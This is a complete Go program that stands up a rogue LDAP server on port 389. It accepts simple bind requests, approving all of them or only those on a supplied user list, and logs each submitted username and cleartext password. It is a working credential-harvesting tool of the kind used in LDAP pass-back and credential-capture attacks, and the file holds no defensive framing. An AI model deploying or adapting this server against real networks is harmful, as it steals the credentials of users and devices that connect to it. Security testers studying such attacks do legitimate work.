package main

import (
	"flag"
	"fmt"
	"log"

	"bufio"
	"os"

	ldap "github.com/vjeantet/ldapserver"
)

var allowed = map[string]bool{}

func handle(w ldap.ResponseWriter, m *ldap.Message) {
	r := m.GetBindRequest()
	success := ldap.NewBindResponse(ldap.LDAPResultSuccess)
	failure := ldap.NewBindResponse(ldap.LDAPResultNoSuchObject)

	username := fmt.Sprintf("%s", r.Name())
	password := r.AuthenticationSimple().String()

	log.Printf("[+] Username: %s Password: %s\n", username, password)

	if len(allowed) < 1 {
		w.Write(success)
		return
	}

	if ok := allowed[username]; !ok {
		w.Write(failure)
		return
	}

	w.Write(success)
}

func main() {
	addr := flag.String("addr", ":389", "Address for LDAP server to bind to")
	ufile := flag.String("users", "", "File containing a line separated list of users who are allowed to bind to the server.")
	flag.Parse()

	if *ufile != "" {
		fh, err := os.Open(*ufile)
		if err != nil {
			log.Fatalf("[!] Could not open file: %s\n", err.Error())
		}
		defer fh.Close()
		scanner := bufio.NewScanner(fh)
		for scanner.Scan() {
			allowed[scanner.Text()] = true
		}
		if err := scanner.Err(); err != nil {
			log.Fatalf("[!] Error reading file: %s\n", err.Error())
		}
	}

	server := ldap.NewServer()
	routes := ldap.NewRouteMux()
	routes.Bind(handle)
	server.Handle(routes)

	log.Fatal(server.ListenAndServe(*addr))

}
